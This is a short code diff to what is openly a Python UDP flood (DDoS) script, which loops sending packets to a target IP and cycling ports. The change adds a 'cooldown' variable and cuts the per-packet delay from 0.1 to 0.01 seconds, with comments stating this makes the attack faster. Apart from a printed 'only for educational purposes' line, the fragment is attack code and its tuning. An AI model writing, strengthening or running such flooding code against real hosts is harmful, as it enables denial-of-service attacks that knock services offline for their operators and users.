@@ -43,6 +43,7 @@ time.sleep(5)
 print "    DDOS ATTACK STARTED. NOTE: ONLY FOR EDUCATIONAL PURPOSES"
 time.sleep(3)
 sent = 0
+cooldown = 0.01  # Adjust cooldown timer (lower value = faster attack)
 while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
@@ -50,4 +51,4 @@ while True:
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
         port = 1
-    time.sleep(0.1) # Add a time delay of 0.1 seconds after each packet is sent
+    time.sleep(cooldown)  # Adjust the time delay to control the attack speed
